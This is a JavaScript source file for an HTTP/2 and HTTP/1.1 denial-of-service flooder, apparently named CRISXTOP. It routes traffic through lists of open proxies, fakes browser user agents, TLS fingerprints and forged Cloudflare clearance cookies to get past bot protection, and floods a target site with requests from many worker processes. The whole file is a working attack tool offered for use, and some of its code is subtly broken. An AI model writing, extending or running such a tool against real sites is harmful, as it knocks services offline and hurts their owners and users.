
const net = require("net");
const http2 = require("http2");
const http = require('http');
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const socks = require('socks').SocksClient;
const crypto = require("crypto");
const HPACK = require('hpack');
const fs = require("fs");
const os = require("os");
const colors = require("colors");
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");
let timer = 0;
const timestamp = Date.now();
const timestampString = timestamp.toString().substring(0, 10);
function encodeFrame(streamId, type, payload = "", flags = 0) {
    let frame = Buffer.alloc(9);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0)
        frame = Buffer.concat([frame, payload]);
    return frame;
}

function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

const browserVersion = getRandomInt(112, 120);
    const headerBuilder = {
        userAgent: [
            `Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`,
        `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`,
        `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`,
        `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`,
        `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`,
        `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`,
        `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`,
        `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`,
        `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`,
        `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`,
        `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`,
        `Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36 Edge/12.0`,
        `Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36 Edge/12.0`,
        `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`,
        `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`,
        `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`,
        `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`,
        `Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36 Edge/12.0`,
        `Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36 Edge/12.0`,
        `Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36 Edge/12.0`,
        `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`,
        `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`,
        `Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`,
        `Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`,
        `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`,
        `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`,
        `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`,
        `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`,
        ],
  acceptLang: ['ko-KR', 'en-US', 'zh-CN', 'zh-TW', 'ja-JP', 'en-GB', 'en-AU', 'en-GB,en-US;q=0.9,en;q=0.8', /*...*/],

  acceptEncoding: ['gzip, deflate, br', 'gzip, br', 'deflate', 'gzip, deflate, lzma, sdch', 'deflate'],

  accept: [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
    // Danh s?ch accept ti?p theo...
  ],

  Sec: { dest: ['image', 'media', 'worker'], site: ['none'], mode: ['navigate', 'no-cors'] },

  Custom: {
    dnt: ['0', '1'],
    ect: ['3g', '2g', '4g'],
    downlink: ['0', '0.5', '1', '1.7'],
    rtt: ['510', '255'],
    devicememory: ['8', '1', '6', '4', '16', '32'],
    te: ['trailers', 'gzip'],
    version: ['Win64; x64', 'Win32; x32']
  }
};

const fwfw = ['Google Chrome', 'Brave'];
                        const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];
                        const ref = ["same-site", "same-origin", "cross-site"];
                        const ref1 = ref[Math.floor(Math.random() * ref.length)];

                        let brandValue;
                        if (browserVersion === 120) {
                            brandValue = `\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\", \"${wfwf}\";v=\"${browserVersion}\"`;
                        } else if (browserVersion === 121) {
                            brandValue = `\"Not A(Brand\";v=\"99\", \"${wfwf}\";v=\"${browserVersion}\", \"Chromium\";v=\"${browserVersion}\"`;
                        }
                        else if (browserVersion === 122) {
                            brandValue = `\"Chromium\";v=\"${browserVersion}\", \"Not(A:Brand\";v=\"24\", \"${wfwf}\";v=\"${browserVersion}\"`;
                        }
                        else if (browserVersion === 123) {
                            brandValue = `\"${wfwf}\";v=\"${browserVersion}\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\"`;
                        }
                         const secChUa = `${brandValue}`;
                         const selectedUserAgent = randomElement(headerBuilder.userAgent);
function randomIntn(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 }
    
  function randstr(length) {
		const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}
  function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
 const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
 const randomStringArray = Array.from({ length }, () => {
   const randomIndex = Math.floor(Math.random() * characters.length);
   return characters[randomIndex];
 });

 return randomStringArray.join('');
}
    const cplist = [
  "TLS_AES_128_GCM_SHA256",
"TLS_AES_256_GCM_SHA384",
"TLS_CHACHA20_POLY1305_SHA256",
"TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256",
"TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384",
"TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256",
"TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384",
"TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA",
"TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384",
"TLS_RSA_WITH_AES_128_GCM_SHA256",
"TLS_RSA_WITH_AES_256_GCM_SHA384",
"TLS_RSA_WITH_AES_128_CBC_SHA",
"TLS_RSA_WITH_AES_256_CBC_SHA",
"TLS_RSA_WITH_3DES_EDE_CBC_SHA",
 ];
 var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
  const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
  const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID', 'ERR_SOCKET_BAD_PORT'];
process.on('uncaughtException', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 const sigalgs = [
     "ecdsa_secp256r1_sha256",
          "rsa_pss_rsae_sha256",
          "rsa_pkcs1_sha256",
          "ecdsa_secp384r1_sha384",
          "rsa_pss_rsae_sha384",
          "rsa_pkcs1_sha384",
          "rsa_pss_rsae_sha512",
          "rsa_pkcs1_sha512"
] 
  let SignalsList = sigalgs.join(':')
const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";
const secureOptions = 
 crypto.constants.SSL_OP_NO_SSLv2 |
 crypto.constants.SSL_OP_NO_SSLv3 |
 crypto.constants.SSL_OP_NO_TLSv1 |
 crypto.constants.SSL_OP_NO_TLSv1_1 |
 crypto.constants.SSL_OP_NO_TLSv1_3 |
 crypto.constants.ALPN_ENABLED |
 crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
 crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
 crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
 crypto.constants.SSL_OP_COOKIE_EXCHANGE |
 crypto.constants.SSL_OP_PKCS1_CHECK_1 |
 crypto.constants.SSL_OP_PKCS1_CHECK_2 |
 crypto.constants.SSL_OP_SINGLE_DH_USE |
 crypto.constants.SSL_OP_SINGLE_ECDH_USE |
 crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
 if (process.argv.length < 8){console.log(`Usage: host time req thread proxy.txt `); process.exit();}
 const secureProtocol = "TLS_method";
 const headers = {};
 
 const secureContextOptions = {
     ciphers: ciphers,
     sigalgs: SignalsList,
     honorCipherOrder: true,
     secureOptions: secureOptions,
     secureProtocol: secureProtocol
 };
 
 const secureContext = tls.createSecureContext(secureContextOptions);
 const args = {
     target: process.argv[2],
     time: ~~process.argv[3],
     Rate: ~~process.argv[4],
     threads: ~~process.argv[5],
     proxyFile: process.argv[6],
      protocol: process.argv[7] // New argument for protocol choice (http1 or http2)
 }
 

 var proxies = readLines(args.proxyFile);
 const parsedTarget = url.parse(args.target); 
 class NetSocket {
     constructor(){}
 
     async SOCKS5(options, callback) {

      const address = options.address.split(':');
      socks.createConnection({
        proxy: {
          host: options.host,
          port: options.port,
          type: 5
        },
        command: 'connect',
        destination: {
          host: address[0],
          port: +address[1]
        }
      }, (error, info) => {
        if (error) {
          return callback(undefined, error);
        } else {
          return callback(info.socket, undefined);
        }
      });
     }
  HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n"; //Keep Alive
     const buffer = new Buffer.from(payload);
     const connection = net.connect({
        host: options.host,
        port: options.port,
    });

    connection.setTimeout(options.timeout * 600000);
    connection.setKeepAlive(true, 600000);
    connection.setNoDelay(true)
    connection.on("connect", () => {
       connection.write(buffer);
   });

   connection.on("data", chunk => {
       const response = chunk.toString("utf-8");
       const isAlive = response.includes("HTTP/1.1 200");
       if (isAlive === false) {
           connection.destroy();
           return callback(undefined, "error: invalid response from proxy server");
       }
       return callback(connection, undefined);
   });

   connection.on("timeout", () => {
       connection.destroy();
       return callback(undefined, "error: timeout exceeded");
   });

}
}


 const Socker = new NetSocket();
 
 function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
 const MAX_RAM_PERCENTAGE = 95;
const RESTART_DELAY = 1000;

 if (cluster.isMaster) {
    console.clear()
    console.log(`CRISXTOP LATEST VERSION`.white)
    console.log(`--------------------------------------------`.gray)
    console.log(`Target: `.red + process.argv[2].white)
    console.log(`Time: `.red + process.argv[3].white)
    console.log(`Rate: `.red + process.argv[4].white)
    console.log(`Thread: `.red + process.argv[5].white)
    console.log(`ProxyFile: `.red + process.argv[6].white)
     console.log(`HTTP-VERSION: `.red + process.argv[7].white)
    console.log(`--------------------------------------------`.gray)
    console.log(`Note: Only work on http/2 or http/1.1 `.brightCyan)
    const restartScript = () => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }

        console.log('[>] Restarting the script', RESTART_DELAY, 'ms...');
        setTimeout(() => {
            for (let counter = 1; counter <= args.threads; counter++) {
                cluster.fork();
            }
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;

        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            console.log('[!] Maximum RAM usage:', ramPercentage.toFixed(2), '%');
            restartScript();
        }
    };
	setInterval(handleRAMUsage, 5000);
	
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {
	setInterval(runFlooder,1)
}
  function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80";
  const rateHeaders1 = [
    { "X-Forwarded-For": parsedProxy[0] },
    { "source-ip": randstr(5) },
    { "Vary": randstr(5) },
    { "CF-Ratelimit-Remaining": Math.floor(Math.random() * 100) },
    { "CF-Ratelimit-Limit": Math.floor(Math.random() * 200) + 100 },
];
const rateHeaders2 = [
    { "TTL-3": "1.5" },
    { "CF-WAF-Action": "Manage challenge"},
    { "From-Unknown-Botnet": "Crisx12012" },
    { "BypassMeMory": "false" },
    { "pragma": "no-cache" },
];
const rateHeaders3 = [
    { "A-IM": "Feed" },
    { 'CDN-Loop': 'cloudflare' },
    { "X-Frame-Options": "deny" },
    { "X-ASP-NET": randstr(25) },
    { "X-Vercel-Cache": randstr(15) },
    { "Alt-Svc": "http/1.1=http2." + parsedTarget.host + "; ma=7200" },
];
const rateHeaders4 = [
    { "Service-Worker-Navigation-Preload": "true" },
    { "Supports-Loading-Mode": "credentialed-prerender" },
    { "data-return": "false" },
    { "x-requested-with": "XMLHttpRequest" },
];

const rhd = [
    { 'RTT': randomElement(headerBuilder.Custom.rtt) },
    { "DNT": randomElement(headerBuilder.Custom.dnt) },
    { "te": randomElement(headerBuilder.Custom.te) },
    { 'Nel': '{ "report_to": "name_of_reporting_group", "max_age": 12345, "include_subdomains": false, "success_fraction": 0.0, "failure_fraction": 1.0 }' },
];
const hd1 = [
    { 'Accept-Range': Math.random() < 0.5 ? 'bytes' : 'none' },
    { 'Delta-Base': '12340001' },
];

function randstr(length) {
    const characters = "0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
};

const generateNumbers = Math.floor(Math.random() * (10000 - 1000 + 1) + 1000);
const version = Math.floor(Math.random() * (108 - 100 + 1) + 100);
const hcookie = `cf_clearance=${randstr(22)}_${randstr(1)}.${randstr(3)}.${randstr(14)}-${timestampString}-1.0-${randstr(6)}+${randstr(80)}=`;

const headers = {
    ":method": "GET",
    ":authority": parsedTarget.host,
    ":scheme": "https",
    ":path": parsedTarget.path + '?q=' + generateRandomString(6, 7) + '&' + generateRandomString(6, 7),
    "upgrade-insecure-requests": "1",
};


const proxyOptions = {
  host: parsedProxy[0],
  port: ~~parsedProxy[1],
  address: `${parsedTarget.host}:443`,
  timeout: 100
};
Socker.HTTP(proxyOptions, async (connection, error) => {
 if (error) return;
 connection.setKeepAlive(true, 600000);
 connection.setNoDelay(true)
 const settings = {
    initialWindowSize: 15663105,
};

const tlsOptions = {
    secure: true,
    ALPNProtocols: ["h2", "http/1.1"],
    ciphers: cipper,
    sigalgs: sigalgs,
    requestCert: true,
    socket: connection,
    ecdhCurve: ecdhCurve,
    honorCipherOrder: false,
    rejectUnauthorized: false,
    minVersion: 'TLSv1.2',
    maxVersion: 'TLSv1.3',
    secureOptions: secureOptions,
    secureContext: secureContext,
    host: parsedTarget.host,
    servername: parsedTarget.host,
};

const tlsSocket = tls.connect(parsedPort, parsedTarget.host, tlsOptions);

// Thi?t l?p c?c c?i d?t cho k?t n?i TLS
tlsSocket.allowHalfOpen = true;
tlsSocket.setNoDelay(true);
tlsSocket.setKeepAlive(true, 60000);
tlsSocket.setMaxListeners(0);

// T?o fingerprint JA3
function generateJA3Fingerprint(socket) {
    const cipherInfo = socket.getCipher();
    const supportedVersions = socket.getProtocol();

    if (!cipherInfo) {
        console.error('Cipher info is not available. TLS handshake may not have completed.');
        return null;
    }

    const ja3String = `${cipherInfo.name}-${cipherInfo.version}:${supportedVersions}:${cipherInfo.bits}`;

    const md5Hash = crypto.createHash('md5');
    md5Hash.update(ja3String);

    return md5Hash.digest('hex');
}

tlsSocket.on('connect', () => {
    const ja3Fingerprint = generateJA3Fingerprint(tlsSocket);
});

let hpack = new HPACK();
let client;
let custom_header = 262144;
let custom_window = 6291456;
let custom_table = 65536;
let maxConcurrentStreams = 500;
if (args.protocol === "http2") {
    client = http2.connect(parsedTarget.href, {
        protocol: "https",
        createConnection: () => tlsSocket,
        settings: {
           headerTableSize: custom_header,
            initialWindowSize: custom_window,
            maxHeaderListSize: custom_table,
            maxConcurrentStreams: maxConcurrentStreams,
            enablePush: false,
            enableConnectProtocol: false,
        },
        socket: tlsSocket,
    });
    function TCP_CHANGES_SERVER() {
    const congestionControlOptions = ['cubic', 'reno', 'bbr', 'dctcp', 'hybla'];
    const sackOptions = ['1', '0'];
    const windowScalingOptions = ['1', '0'];
    const timestampsOptions = ['1', '0'];
    const selectiveAckOptions = ['1', '0'];
    const tcpFastOpenOptions = ['3', '2', '1', '0'];

    const congestionControl = congestionControlOptions[Math.floor(Math.random() * congestionControlOptions.length)];
    const sack = sackOptions[Math.floor(Math.random() * sackOptions.length)];
    const windowScaling = windowScalingOptions[Math.floor(Math.random() * windowScalingOptions.length)];
    const timestamps = timestampsOptions[Math.floor(Math.random() * timestampsOptions.length)];
    const selectiveAck = selectiveAckOptions[Math.floor(Math.random() * selectiveAckOptions.length)];
    const tcpFastOpen = tcpFastOpenOptions[Math.floor(Math.random() * tcpFastOpenOptions.length)];

    const command = `sudo sysctl -w net.ipv4.tcp_congestion_control=${congestionControl} \
net.ipv4.tcp_sack=${sack} \
net.ipv4.tcp_window_scaling=${windowScaling} \
net.ipv4.tcp_timestamps=${timestamps} \
net.ipv4.tcp_sack=${selectiveAck} \
net.ipv4.tcp_fastopen=${tcpFastOpen}`;

    exec(command, () => { });
}

setInterval(() => {
    timer++;
}, 1000);
     const okelaid = setInterval(() => {
        if (timer <= 10) {
            custom_header++;
            custom_window++;
            custom_table++;
            maxConcurrentStreams++;
            timer++;
        } else {
            custom_table = 65536;
            custom_window = 6291456;
            custom_header = 262144;
            maxConcurrentStreams = 500;
            timer = 0;
        }
    }, 10000);
}
    client.on("connect", async () => {
    const intervalId = setInterval(async () => {
        const shuffleObject = (obj) => {
            // Shuffle the object randomly
            const keys = Object.keys(obj);
            for (let i = keys.length - 1; i > 0; i--) {
                const j = Math.floor(Math.random() * (i + 1));
                [keys[i], keys[j]] = [keys[j], keys[i]];
            }
            const shuffledObj = {};
            keys.forEach(key => shuffledObj[key] = obj[key]);
            return shuffledObj;
        };

        const randomItem = (array) => array[Math.floor(Math.random() * array.length)];
        const dynHeaders = shuffleObject({
            "user-agent":selectedUserAgent,
            ...(Math.random() < 0.5 && { rhd: [randomItem(rhd)] }),
            ...(Math.random() < 0.5 && { hd1: [randomItem(hd1)] }),
            ...headers,
            ...(hcookie && { "cookie": hcookie }),
            ...randomItem(rateHeaders1),
            ...randomItem(rateHeaders2),
            ...randomItem(rateHeaders3),
            ...randomItem(rateHeaders4),
        });
        const packed = Buffer.concat([
            Buffer.from([0x80, 0, 0, 0, 0xFF]),
            hpack.encode(dynHeaders)
        ]);
        const streamId = 1;
        const requests = [];
        for (let i = 0; i < args.Rate; i++) {
            const requestPromise = new Promise((resolve, reject) => {
                const req = client.request(dynHeaders).on("response", response => {
                    req.close();
                    req.destroy();
                    resolve();
                });
                req.end();
            });
            const frame = encodeFrame(streamId, 1, packed, 0x25);
            requests.push({ requestPromise, frame });
            streamId += 2;
        }

        const resolvedRequests = await Promise.all(requests.map(({ requestPromise }) => requestPromise));
        const frames = requests.map(({ frame }) => frame);
        tlsSocket.write(Buffer.concat(frames), (err) => {
            if (err) {
                console.error('Error writing frames:', err);
            }
        });
    }, 100);
});

        client.on("close", () => {
        tlsSocket.destroy();
            client.destroy();
            connection.destroy();
            return;
        });

        client.on("error", error => {
            client.destroy();
            connection.destroy();
            return;
        });
        });
        }

const StopScript = () => process.exit(1);

setTimeout(StopScript, args.time * 1000);

process.on('uncaughtException', error => {});
process.on('unhandledRejection', error => {});

